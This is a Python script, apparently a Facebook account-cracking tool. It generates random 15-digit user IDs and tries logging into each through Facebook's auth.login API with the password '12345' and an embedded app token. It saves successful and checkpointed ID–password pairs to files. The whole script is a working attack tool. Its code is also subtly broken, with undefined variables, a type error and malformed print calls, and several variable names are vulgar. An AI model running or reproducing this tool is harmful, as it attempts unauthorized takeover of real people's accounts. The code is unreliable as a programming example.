import requests,subprocess,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress,mechanize
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote

br = mechanize.Browser()

##colours
p = "\x1b[0;97m" # White
m = "\x1b[0;91m" # Red
h = "\x1b[0;92m" # Green
k = "\x1b[0;93m" # Yellow
b = "\x1b[0;94m" # Blue
u = "\x1b[0;95m" # Purple
o = "\x1b[0;96m" # Light Blue
N = "\033[0m" # Off Color

##logo
_logo_line_1_ = ('\x1b[1;91m___   ___ ___ ___ _______ _______')
_logo_line_2_ = ('\x1b[1;91m| |   | | | | | | |  ___| |_   _|')
_logo_line_3_ = ('\x1b[1;92m| |___| | | | | | | |___    | |  ')
_logo_line_4_ = ('\x1b[1;92m|  ___  | | | | | |___  |   | |  ')
_logo_line_5_ = ('\x1b[1;91m| |   | | | |_| | ____| |  _| |  ')
_logo_line_6_ = ('\x1b[1;91m|_|   |_| |_____| |_____| |___|  ')
_logo_line_7_ = ('\x1b[1;97m-------------------------------------------------')
def _my_logo_():
    print(_logo_line_1_)
    print(_logo_line_2_)
    print(_logo_line_3_)
    print(_logo_line_4_)
    print(_logo_line_5_)
    print(_logo_line_6_)
    print(_logo_line_7_+'\n')

def menu():
    _my_logo_()
    h = input('%s╚══[%s•%s] %sinput amount of ids you want do dump : '%(k,p,k,p))
    print("dump compleat. . . .");time.sleep(3)
    id_genarate()


def id_genarate():
    k = 10000000
    i = 1
    while i < h:
        x = random.randint(0000000,9999999)
        igd = (str(k) + str(x))
        if len(igd) == 15:
            i = i+1
            f = open("output.txt", "a")
            print(igd, file=f)
        else:
            pass
    test()

def test():
    try:os.mkdir("save")
    except:pass
    buka_baju = open("output.txt" , "r").readlines()
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split(" ")
        try:
            pass1 = 12345
            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=" + titid[0] + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm")
            q = json.load(data)
            if 'access_token' in q:
                print("[ok]:%s|***|%s")(titid[0],pass1)
                okb = open('save/successfull.txt', 'a')
                okb.write(titid[0]+'-•◈•-'+pass1+'\n')
                okb.close()
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print("[cp]:%s|***|%s")(titid[0],pass1)
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(titid[0]+'-•◈•-'+pass1+'\n')
                    cps.close()
        except:pass
os.system("del output.txt")






##print(titid[0], "12345");time.sleep(0.09)


if __name__=='__main__':
  menu()

